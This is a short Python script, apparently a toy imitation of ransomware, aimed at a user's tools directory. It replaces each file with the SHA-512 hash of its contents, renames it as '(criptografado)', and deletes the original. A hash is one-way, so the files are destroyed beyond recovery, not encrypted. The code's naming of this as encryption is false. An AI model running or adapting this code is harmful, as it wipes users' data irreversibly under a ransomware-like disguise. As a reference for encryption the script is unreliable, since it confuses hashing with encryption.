import hashlib
import os

dir_path = "/home/ander/Documentos/tools/"

for file_name in os.listdir(dir_path):
    file_path = os.path.join(dir_path, file_name)

    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = hashlib.sha512(file_data).hexdigest().encode()

        new_file_name = "(criptografado) " + file_name
        new_file_path = os.path.join(dir_path, new_file_name)

        with open(new_file_path, 'wb') as new_file:
            new_file.write(encrypted_data)

    os.remove(file_path)
